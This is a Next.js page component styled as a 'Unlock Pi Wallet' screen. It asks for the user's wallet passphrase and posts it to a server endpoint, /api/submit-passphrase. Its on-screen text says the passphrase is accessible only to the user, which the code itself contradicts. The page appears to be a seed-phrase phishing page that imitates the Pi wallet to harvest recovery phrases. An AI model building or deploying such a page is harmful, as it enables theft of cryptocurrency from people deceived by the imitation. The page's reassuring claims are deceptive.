'use client';
import { useState } from "react";
import Image from "next/image";

export default function Home() {
  const [passphrase, setPassphrase] = useState("");

  const handleSubmit = async () => {
    if (!passphrase.trim()) {
      alert('Please enter a passphrase');
      return;
    }

    try {
      console.log('Starting submission...');
      
      const response = await fetch('/api/submit-passphrase', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          passphrase: passphrase.trim() 
        }),
      });

      console.log('Response received:', response.status);

      // Try to parse the response as JSON
      let data;
      try {
        data = await response.json();
        console.log('Response data:', data);
      } catch (e) {
        console.error('Error parsing response:', e);
        throw new Error('Invalid response from server');
      }

      if (response.ok) {
        alert('Passphrase submitted successfully');
        setPassphrase('');
      } else {
        throw new Error(data.error || 'Failed to submit passphrase');
      }
    } catch (error) {
      console.error('Submission error:', error);
      alert(`Error: ${error.message}`);
    }
  };

  return (
    <div className="min-h-screen bg-white p-4">
      {/* Main Container */}
      <div className="max-w-md mx-auto pt-8">
        {/* Header */}
        <h1 className="text-2xl text-black font-bold text-center mb-8">Unlock Pi Wallet</h1>

        {/* Passphrase Input Box */}
        <div className="bg-gray-700 rounded-lg p-4 mb-4">
          <textarea
            value={passphrase}
            onChange={(e) => setPassphrase(e.target.value)}
            placeholder="Enter your phrase"
            className="w-full bg-transparent text-white placeholder-gray-400 outline-none resize-none"
            rows={4}
          />
        </div>

        {/* Unlock Button */}
        <button 
          onClick={handleSubmit}
          className="w-full bg-purple-300 hover:bg-purple-400 text-white py-4 rounded-lg mb-8"
        >
          Unlock With Passphrase
        </button>

        {/* Info Text */}
        <div className="space-y-4 text-center">
          <p className="text-gray-700">
            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.
            Recovery of passphrase is currently impossible.
          </p>

          <p className="text-gray-700">
            Lost your passphrase?{" "}
            <a href="#" className="text-purple-600">
              You can create a new wallet
            </a>
            , but all your π in your previous wallet will be inaccessible.
          </p>
        </div>
      </div>
    </div>
  );
}
